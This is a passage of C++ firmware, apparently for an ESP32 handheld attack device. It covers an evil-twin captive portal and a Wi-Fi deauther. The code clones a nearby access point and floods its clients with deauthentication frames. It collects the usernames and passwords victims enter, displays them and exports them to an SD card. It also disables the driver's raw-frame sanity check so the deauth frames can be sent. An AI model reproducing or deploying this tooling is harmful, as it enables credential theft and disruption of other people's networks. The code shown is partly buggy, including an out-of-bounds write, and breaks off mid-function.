      tft.setTextColor(GREEN, TFT_BLACK);
      tft.setCursor(180, 45);
      tft.printf("%d/%d", page + 1, max(1, totalPages));

      int y = 80;
      int start = page * rowsPerPage;
      int end = min(start + rowsPerPage, count);
      for (int row = start; row < end; row++) {
        int real = idx[row];
        String ssid = WiFi.SSID(real);
        int rssi = WiFi.RSSI(real);
        int ch = WiFi.channel(real);
        uint8_t auth = WiFi.encryptionType(real);
        const char* enc = (auth == WIFI_AUTH_OPEN) ? "OPEN" : "SEC";

        String disp = ssid;
        if (disp.length() > 14) disp = disp.substring(0, 14) + "...";

        char buf[64];
        snprintf(buf, sizeof(buf), "%02d %-17s %3d Ch%2d %s", row + 1, disp.c_str(), rssi, ch, enc);

        uint16_t color = (auth == WIFI_AUTH_OPEN) ? ORANGE : TFT_WHITE;
        tft.setTextColor(color, TFT_BLACK);
        tft.setCursor(8, y);
        tft.println(buf);
        y += 16;
      }

      bool prevEnabled = page > 0;
      bool nextEnabled = (page + 1) * rowsPerPage < count;
      cpDrawCloneFooter(prevEnabled, nextEnabled);

      int tx, ty;
      while (!readTouchXY(tx, ty)) delay(10);
      delay(200);

      const int footerY = tft.height() - FeatureUI::FOOTER_H;
      if (ty >= footerY) {
        if (tx < 60) return false;
        if (tx < 120) break;
        if (tx < 180 && prevEnabled) { page--; continue; }
        if (tx >= 180 && nextEnabled) { page++; continue; }
        continue;
      }

      if (ty >= 80 && ty < 80 + (rowsPerPage * 16)) {
        int clickedOffset = (ty - 80) / 16;
        int absoluteRow = page * rowsPerPage + clickedOffset;
        if (absoluteRow >= start && absoluteRow < end) {
          int real = idx[absoluteRow];
          outSsid = WiFi.SSID(real);
          outChannel = (uint8_t)WiFi.channel(real);

          memcpy(outBssid, WiFi.BSSID(real), 6);
          return true;
        }
      }
    }
  }
}

static void cpCloneExistingAPFlow() {
  bool wasActive = attackActive;
  if (attackActive) stopAttack();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(100);

  String chosen;
  uint8_t ch = 1;
  uint8_t bssid[6] = {0};
  bool ok = cpCloneScanAndSelect(chosen, ch, bssid);
  WiFi.scanDelete();

  if (!ok) {
    if (wasActive) startAttack();
    drawMainMenu();
    return;
  }

  ap_channel = (ch == 0 ? 1 : ch);
  saveSSID(chosen);
  Serial.printf("[CP] Cloned AP: SSID='%s' CH=%u\n", custom_ssid, (unsigned)ap_channel);

  memset(&cp_target_ap, 0, sizeof(cp_target_ap));
  strcpy((char*)cp_target_ap.ssid, chosen.c_str());
  memcpy(cp_target_ap.bssid, bssid, 6);
  cp_target_ap.primary = ap_channel;

  cpStartDeauth(chosen, bssid, ap_channel);

  delay(500);

  startAttack();
  drawMainMenu();
}

void drawMainMenu() {
  currentScreen = MAIN_MENU;

  tft.setTextSize(1);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  displayPrint("Current SSID:", GREEN, false);
  displayPrint(custom_ssid, WHITE, false);
  displayPrint("...", GREEN, false);

  displayPrint("Channel: " + String(ap_channel), GREEN, false);
  displayPrint(attackActive ? "Status: Active" : "Status: Inactive", GREEN, false);
  if (cp_deauth_active) {
    char buf[32];
    snprintf(buf, sizeof(buf), "Evil Twin: %u pkts", (unsigned)cp_deauth_packet_count);
    displayPrint(buf, ORANGE, false);
  }
}

void drawInputField() {
  tft.fillRect(10, 55, 220, 25, TFT_DARKGREY);
  tft.drawRect(9, 54, 222, 27, ORANGE);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);
  tft.setCursor(15, 60);
  String displayText = inputSSID;
  if (cursorState && keyboardActive) {
    displayText += "|";
  }
  tft.println(displayText);
}

void drawKeyboard() {
  currentScreen = KEYBOARD;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setCursor(1, 230);
  tft.println("[!] Set the SSID that your AP will use");
  tft.setCursor(20, 245);
  tft.println("to host the captive portal.");

  tft.setCursor(1, 270);
  tft.println("[!] Shuffle: Randomly generates SSID");
  tft.setCursor(20, 285);
  tft.println("suggestions for your access point.");

  drawInputField();

  int yOffset = 95;
  for (int row = 0; row < 4; row++) {
    int xOffset = 1;
    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
      tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, TFT_DARKGREY);
      tft.setTextColor(TFT_WHITE);
      tft.setTextSize(1);
      tft.setCursor(xOffset + 6, yOffset + 5);
      tft.print(keyboardLayout[row][col]);
      Serial.printf("Key %c at x=%d-%d, y=%d-%d\n", keyboardLayout[row][col], xOffset, xOffset + keyWidth, yOffset, yOffset + keyHeight);
      xOffset += keyWidth + keySpacing;
    }
    yOffset += keyHeight + keySpacing;
  }

tft.setTextColor(ORANGE);
tft.setTextSize(1);
tft.setTextDatum(MC_DATUM);

tft.fillRoundRect(5, 185, 70, 25, 4, DARK_GRAY);
tft.drawRoundRect(5, 185, 70, 25, 4, ORANGE);
tft.drawString("Back", 40, 197);
Serial.printf("Back button at x=5-75, y=185-210\n");

tft.fillRoundRect(85, 185, 70, 25, 4, DARK_GRAY);
tft.drawRoundRect(85, 185, 70, 25, 4, ORANGE);
tft.drawString("Shuffle", 120, 197);
Serial.printf("Series button at x=85-155, y=185-210\n");

tft.fillRoundRect(165, 185, 70, 25, 4, DARK_GRAY);
tft.drawRoundRect(165, 185, 70, 25, 4, ORANGE);
tft.drawString("OK", 200, 197);
Serial.printf("OK button at x=165-235, y=185-210\n");
}

void drawCredList() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setCursor(0, 50);
  tft.println("Credentials List:");

  tft.setCursor(0, 70);
  tft.print("User");
  tft.setCursor(80, 70);
  tft.print("Pass");
  tft.setCursor(160, 70);
  tft.print("SSID");
  tft.drawLine(0, 80, 245, 80, TFT_WHITE);

  int count = EEPROM.read(COUNT_ADDR);
  Serial.printf("Reading %d credentials from EEPROM\n", count);

  int startIdx = credPage * 18;
  int yOffset = 90;

  if (count == 0) {
    tft.setCursor(0, yOffset);
    tft.println("No credentials");
    Serial.println("No credentials found");
  } else {
    for (int i = startIdx; i < min(count, startIdx + 18); i++) {
      Credential cred;
      EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
      Serial.printf("Credential %d at address %d: User=%s, Pass=%s, SSID=%s\n",
                    i, CRED_ADDR + (i * CRED_SIZE), cred.username, cred.password, cred.ssid);

      tft.setTextColor(TFT_WHITE);
      tft.setCursor(0, yOffset);
      tft.println(cred.username);
      tft.setCursor(80, yOffset);
      tft.println(cred.password);
      tft.setCursor(160, yOffset);
      tft.println(cred.ssid);

      tft.setTextColor(UI_WARN);
      tft.setCursor(223, yOffset - 1);
      tft.println("X");

      yOffset += 10;
    }
  }

int buttonY = 290;
tft.setTextColor(ORANGE);
tft.setTextSize(1);
tft.setTextDatum(MC_DATUM);

tft.fillRoundRect(5, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(5, buttonY, 50, 20, 8, ORANGE);
tft.drawString("Back", 30, buttonY + 10);

tft.fillRoundRect(65, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(65, buttonY, 50, 20, 8, ORANGE);
tft.drawString("Clear", 90, buttonY + 10);

tft.fillRoundRect(125, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(125, buttonY, 50, 20, 8, ORANGE);
tft.drawString("Export", 150, buttonY + 10);

if (credPage > 0) {
  tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
  tft.drawRoundRect(185, buttonY, 50, 20, 8, ORANGE);
  tft.drawString("Prev", 210, buttonY + 10);
} else if (count > (credPage + 1) * 15) {
  tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
  tft.drawRoundRect(185, buttonY, 50, 20, 8, ORANGE);
  tft.drawString("Next", 210, buttonY + 10);
}

}

void stopAttack() {
  if (attackActive) {
    WiFi.softAPdisconnect(true);
    Serial.println("Access Point stopped");
    displayPrint("Access Point stopped", GREEN, false);

    dnsServer.stop();
    Serial.println("DNS server stopped");
    displayPrint("DNS server stopped", GREEN, false);

    server.close();
    Serial.println("Web server stopped");
    displayPrint("Web server stopped", GREEN, false);

    cpStopDeauth();

    attackActive = false;
    drawMainMenu();
  } else {
    Serial.println("Attack already inactive");
    displayPrint("Attack already inactive", GREEN, false);
  }
}

void startAttack() {
  if (!attackActive) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(custom_ssid, password, ap_channel);
    Serial.println("Access Point started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());
    int ip = WiFi.softAPIP();
    displayPrint("Access Point started", GREEN, false);

    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    Serial.println("DNS server started");
    displayPrint("DNS server started", GREEN, false);

    setupWebServer();
    server.begin();
    Serial.println("Web server started");
    displayPrint("Web server started", GREEN, false);

    attackActive = true;
    drawMainMenu();
  } else {
    Serial.println("Attack already active");
    displayPrint("Attack already active", GREEN, false);
  }
}

void handleMainMenu(int x, int y) {
  (void)x;
  (void)y;
}

void handleKeyboard(int x, int y) {
  (void)x;
  (void)y;
}

void handleCredList(int x, int y) {
  int count = EEPROM.read(COUNT_ADDR);
  int startIdx = credPage * 18;
  int yOffset = 80;

  for (int i = startIdx; i < min(count, startIdx + 18); i++) {
    if (x >= 220 && x <= 230 && y >= yOffset - 3 && y <= yOffset + 7) {
      Serial.println("Delete button pressed for credential " + String(i));
      deleteCredential(i);
      drawCredList();
      return;
    }
    yOffset += 10;
  }

  int buttonY = 290;

  if (x >= 5 && x <= 55 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Back button pressed");
    currentScreen = MAIN_MENU;
    drawMainMenu();
  }
  if (x >= 65 && x <= 115 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Clear All button pressed");
    clearAllCredentials();
    credPage = 0;
    drawCredList();
  }
  if (x >= 125 && x <= 175 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Export button pressed");
    int dumped = 0;
    if (cpDumpAllCredentialsToSD(&dumped)) {
      cpCredListStatus("Exported " + String(dumped) + " -> SD:/captive_portal/eeprom_dump.csv", TFT_GREEN);
    } else {
      cpCredListStatus("Export failed: SD not ready", TFT_RED);
    }
  }
  if (credPage > 0 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Prev button pressed");
    credPage--;
    drawCredList();
  } else if (count > (credPage + 1) * 15 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Next button pressed");
    credPage++;
    drawCredList();
  }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 6

  static int iconX[ICON_NUM] = {90, 130, 170, 210, 50, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_dialog,
    bitmap_icon_list,
    bitmap_icon_antenna,
    bitmap_icon_power,
    bitmap_icon_wifi2,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0: {

          OnScreenKeyboardConfig cfg;
          cfg.titleLine1      = "[!] Set the SSID that your AP will use";
          cfg.titleLine2      = "to host the captive portal.";
          cfg.rows            = keyboardLayout;
          cfg.rowCount        = 4;
          cfg.maxLen          = 31;
          cfg.shuffleNames    = seriesSSIDs;
          cfg.shuffleCount    = numSeriesSSIDs;
          cfg.buttonsY        = 195;
          cfg.backLabel       = "Back";
          cfg.middleLabel     = "Shuffle";
          cfg.okLabel         = "OK";
          cfg.enableShuffle   = true;
          cfg.requireNonEmpty = true;
          cfg.emptyErrorMsg   = "SSID cannot be empty!";

          OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, inputSSID);
          if (r.accepted && r.text.length() > 0) {
            inputSSID = r.text;
            saveSSID(inputSSID);
          }
          drawMainMenu();
          animationState = 0;
          activeIcon = -1;
          break;
        }
        case 1:
          currentScreen = CRED_LIST;
          credPage = 0;
          drawCredList();
          animationState = 0;
          activeIcon = -1;
          break;
        case 2:
          startAttack();
          animationState = 0;
          activeIcon = -1;
          break;
        case 3:
          stopAttack();
          animationState = 0;
          activeIcon = -1;
          break;

         case 4:
           cpCloneExistingAPFlow();
           animationState = 0;
           activeIcon = -1;
          break;

         case 5:
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;

    case 4: break;
    case 5: break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
     if (currentScreen == KEYBOARD) {
      handleKeyboard(x, y);
    } else if (currentScreen == CRED_LIST) {
      handleCredList(x, y);
    } else {
      handleMainMenu(x, y);
    }

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 5) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void cportalSetup() {

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();

  EEPROM.begin(EEPROM_SIZE);
  int count = EEPROM.read(COUNT_ADDR);
  if (count > MAX_CREDS || count < 0) {
    Serial.println("Invalid credential count, resetting to 0");
    EEPROM.write(COUNT_ADDR, 0);
    EEPROM.commit();
  }
  loadSSID();

  startAttack();

  drawMainMenu();
  setupTouchscreen();
}

void cportalLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  updateStatusBar();
  runUI();

  if (attackActive) {
    dnsServer.processNextRequest();
    server.handleClient();

    unsigned long now = millis();
    if (cp_deauth_active && now - cp_last_deauth_time >= 50) {
      cpSendDeauthFrame();
      cp_last_deauth_time = now;
    }
  }

  if (currentScreen == KEYBOARD) {
    unsigned long now = millis();
    if (now - lastCursorToggle >= 500) {
      cursorState = !cursorState;
      lastCursorToggle = now;
      drawInputField();
      }
    }
  }
}

namespace Deauther {

#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320

// Larger row height = easier touch selection.
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;
static constexpr int LIST_BOTTOM_Y = 300;  // keep clear of the bottom button bar (y=304..320)

uint8_t deauth_frame_default[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00,
    0x01, 0x00
};
uint8_t deauth_frame[sizeof(deauth_frame_default)];

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
bool attack_running = false;
wifi_ap_record_t selectedAp;
uint8_t selectedChannel;
int selected_ap_index = -1;
int network_count = 0;
wifi_ap_record_t *ap_list = nullptr;
bool scanning = false;
uint32_t last_packet_time = 0;
int current_page = 0;
static constexpr int networks_per_page = (LIST_BOTTOM_Y - LIST_FIRST_ROW_Y) / LIST_ROW_H;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    packet_count++;
    if (res == ESP_OK) {
        success_count++;
        consecutive_failures = 0;
    } else {
        consecutive_failures++;

    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    deauth_frame[26] = 7;

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
}

int compare_ap(const void *a, const void *b) {
    wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
    wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
    return ap2->rssi - ap1->rssi;
}

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {

    FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                             : FeatureUI::ButtonStyle::Secondary;
    FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {

    tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

    if (leftButton[0]) {
        drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
    }

    if (prevButton[0]) {
        drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
    }
    if (nextButton[0]) {
        drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
    }
}

void drawScanScreen() {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);

    if (scanning) {
        tft.setCursor(10, 50);
        tft.setTextColor(GREEN);
        tft.println("Scanning...");
        loading(100, ORANGE, 0, 0, 3, true);
        tft.setCursor(10, 65);
        tft.println("Wait a moment.");
        return;
    }

    if (network_count == 0) {
        tft.setTextColor(GREEN);
        tft.setCursor(10, 50);
        tft.println("No networks found.");
        tft.setCursor(10, 65);
        tft.println("Press Rescan.");
    } else {
        int y = LIST_HEADER_Y;
        tft.setTextColor(GREEN);
        tft.setCursor(10, y);
        tft.println("Networks:");
        y += 20;

        int start_index = current_page * networks_per_page;
        int end_index = min(start_index + networks_per_page, network_count);

        for (int i = start_index; i < end_index && y < LIST_BOTTOM_Y; i++) {
            char buf[64];
            char ssid[12];
            strncpy(ssid, (char*)ap_list[i].ssid, 11);
            ssid[11] = '\0';
            if (strlen((char*)ap_list[i].ssid) > 11) strcat(ssid, "...");
            const char* enc = ap_list[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
            snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, ap_list[i].rssi, ap_list[i].primary, enc);
            tft.setCursor(10, y);
            tft.setTextColor(i == selected_ap_index ? ORANGE : (ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
            tft.println(buf);
            y += LIST_ROW_H;
        }

        char page_buf[20];
        snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, (network_count + networks_per_page - 1) / networks_per_page);
        tft.setCursor(180, 50);
        tft.setTextColor(GREEN);
        tft.println(page_buf);
    }

    const char* leftButton = attack_running ? "Stop Attack" : "Rescan";
    bool leftDisabled = false;
    const char* prevButton = "Prev";
    bool prevDisabled = attack_running || current_page == 0;
    const char* nextButton = "Next";
    bool nextDisabled = attack_running || (current_page + 1) * networks_per_page >= network_count;
    drawTabBar(leftButton, leftDisabled, prevButton, prevDisabled, nextButton, nextDisabled);
}

bool scanNetworks() {
    scanning = true;
    current_page = 0;
    drawScanScreen();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    network_count = WiFi.scanNetworks();
    if (network_count == 0) {
        scanning = false;
        return false;
    }

    if (ap_list) free(ap_list);
    ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
    if (!ap_list) {
        scanning = false;
        return false;
    }

    for (int i = 0; i < network_count; i++) {
        wifi_ap_record_t ap_record = {0};
        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
        ap_record.rssi = WiFi.RSSI(i);
        ap_record.primary = WiFi.channel(i);
        ap_record.authmode = WiFi.encryptionType(i);
        ap_list[i] = ap_record;
    }

    qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);

    scanning = false;
    return true;
}

bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
            *channel = WiFi.channel(i);
            WiFi.mode(WIFI_AP);
            delay(100);
            return true;
        }
    }

    WiFi.mode(WIFI_AP);
    delay(100);
    return false;
}

void resetWifi() {
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    packet_count = 0;
    success_count = 0;
    consecutive_failures = 0;
}

void drawAttackScreen() {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);

    char buf[64];
    tft.setTextColor(WHITE);
    snprintf(buf, sizeof(buf), "Target: %s", selectedAp.ssid);
    tft.setCursor(10, 50);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
             selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
    tft.setCursor(10, 70);
    tft.println(buf);

    const char* auth;
    switch (selectedAp.authmode) {
        case WIFI_AUTH_OPEN: auth = "OPEN"; break;
        case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
        case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2-PSK"; break;
        default: auth = "Unknown"; break;
    }
    snprintf(buf, sizeof(buf), "Auth: %s", auth);
    tft.setCursor(10, 85);
    tft.println(buf);

    tft.setCursor(10, 100);
    tft.setTextColor(attack_running ? ORANGE : UI_DIM_TEXT);
    tft.println(attack_running ? "Status: Running" : "Status: Stopped");

    snprintf(buf, sizeof(buf), "Packets: %u", packet_count);
    tft.setCursor(10, 115);
    tft.setTextColor(WHITE);
    tft.println(buf);

    float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
    snprintf(buf, sizeof(buf), "Success: %.2f%%", success_rate);
    tft.setCursor(10, 130);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
    tft.setCursor(10, 145);
    tft.println(buf);

    const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
    drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

void handleTouch() {
    int x, y;
    if (!readTouchXY(x, y)) return;

    bool redraw = false;
    if (selected_ap_index == -1) {
        const int listMaxY = LIST_FIRST_ROW_Y + (networks_per_page * LIST_ROW_H);
        if (!scanning && y >= LIST_FIRST_ROW_Y && y < listMaxY && network_count > 0) {
            int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * networks_per_page);
            if (index >= 0 && index < network_count) {
                selected_ap_index = index;
                selectedAp = ap_list[index];
                selectedChannel = ap_list[index].primary;
                drawScanScreen();
                delay(50);
                drawAttackScreen();
            }
        } else if (!scanning && y >= 290 && y <= 320) {
            if (attack_running) {
                if (x >= 0 && x <= 57) {
                    drawButton(0, 304, 57, 16, "Stop Attack", true, false);
                    attack_running = false;
                    last_packet_time = 0;
                    drawScanScreen();
                    delay(50);
                    redraw = true;
                } else if (x >= 122 && x <= 179) {
                    drawButton(122, 304, 57, 16, "Rescan", true, false);
                    delay(50);
                    if (scanNetworks()) {
                        drawScanScreen();
                    }
                    redraw = true;
                }
            } else {
                if (x >= 0 && x <= 57) {
                    drawButton(0, 304, 57, 16, "Rescan", true, false);
                    delay(50);
                    if (scanNetworks()) {
                        drawScanScreen();
                    }
                    redraw = true;
                } else if (x >= 122 && x <= 179) {
                    if (current_page > 0) {
                        drawButton(117, 304, 57, 16, "Prev", true, false);
                        current_page--;
                        drawScanScreen();
                        delay(50);
                        redraw = true;
                    }
                } else if (x >= 183 && x <= 240) {
                    if ((current_page + 1) * networks_per_page < network_count) {
                        drawButton(178, 304, 57, 16, "Next", true, false);
                        current_page++;
                        drawScanScreen();
                        delay(50);
                        redraw = true;
                    }
                }
            }
        }
    } else {
        if (y >= 290 && y <= 320) {
            if (x >= 0 && x <= 57) {
                drawButton(0, 304, 57, 16, attack_running ? "Stop" : "Start", true, false);
                attack_running = !attack_running;
                if (!attack_running) {
                    last_packet_time = 0;
                }
                drawAttackScreen();
                delay(50);
                redraw = true;
            } else if (x >= 183 && x <= 240) {
                drawButton(177, 304, 57, 16, "Back", true, false);
                attack_running = false;
                last_packet_time = 0;
                selected_ap_index = -1;
                drawScanScreen();
                delay(50);
                redraw = true;
            }
        }
    }

    if (redraw) {
        delay(100);
    }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          scanNetworks();
          delay(50);
          if (scanNetworks()) {
            drawScanScreen();
           }
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 1) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void deautherSetup() {

    tft.fillRect(0, 37, 240, 320, TFT_BLACK);

    setupTouchscreen();
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
    runUI();

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    tft.setTextColor(GREEN, BLACK);
    tft.setTextSize(1);
    tft.setCursor(10, 50);
    tft.println("Initializing...");

    attack_running     = false;
    selected_ap_index  = -1;
    current_page       = 0;
    scanning           = false;

    int bgCount = WiFi.scanComplete();
    if (bgCount > 0) {

